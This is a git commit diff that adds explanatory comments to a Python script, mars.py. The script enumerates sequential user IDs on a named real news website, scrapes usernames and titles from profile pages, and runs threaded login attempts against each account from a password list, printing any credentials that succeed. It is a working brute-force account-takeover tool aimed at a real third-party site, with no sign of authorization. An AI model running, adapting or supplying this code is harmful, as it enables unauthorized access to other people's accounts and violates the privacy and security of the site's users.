b13fb8dace4b5b54971a397b90c310f347454151
Jacob Allen Utley <jacob@halfinjest.com>
2017-11-05 21:25:46 -0600

    Added comments.

--- mars.py
+++ mars.py
@@ -6,6 +6,8 @@ import time
 def output(entry):
 	for i in range(len(entry)):
 		sys.stdout.write(entry[i] + " " * ([8, 32, 32, 8][i] - len(entry[i])))
+#
+# output the given entry with a configured column width
 
 	sys.stdout.write("\n")
 
@@ -15,40 +17,58 @@ def attempt(entry, passwords):
 			data = {"form_id": "user_login", "name": entry[1], "pass": item}
 
 			response = requests.post("http://zerohedge.com/user/", data).text
+#
+# submit a POST request with the entry information for each password
 
 			if "/user/password" not in response:
 				output(entry + [item])
 
 				exit()
+#
+# output the information and exit the program if the login is successful
 
 	except Exception as error:
 		time.sleep(1)
+#
+# sleep for one second if an error is returned
 
 def evaluate(number, passwords):
 	try:
 		entry = [number]
 
 		response = requests.get("http://zerohedge.com/user/" + number).text
+#
+# request information from the user page to fill the entry
 
 		if "Page Not Found" not in response:
 			entry.append(response[response.index("canonical") + \
 				48:response.index("og:url") - 21])
+#
+# append the username to the entry
 
 			entry.append(response[response.index("<title>") + \
 				7:response.index(" | Zero Hedge")])
+#
+# append the title to the entry
 
 			threading.Thread(target=attempt, args=(entry, passwords)).start()
+#
+# begin a thread to attempt the entry with the given password list
 
 	except Exception as error:
 		pass
 
 def main(passwords):
 	output(["Number", "Username", "Title", "Password"])
+#
+# output the column headers
 
 	number = 0
 
 	while True:
 		evaluate(str(number), passwords)
+#
+# evaluate the user identification number
 
 		number += 1
 
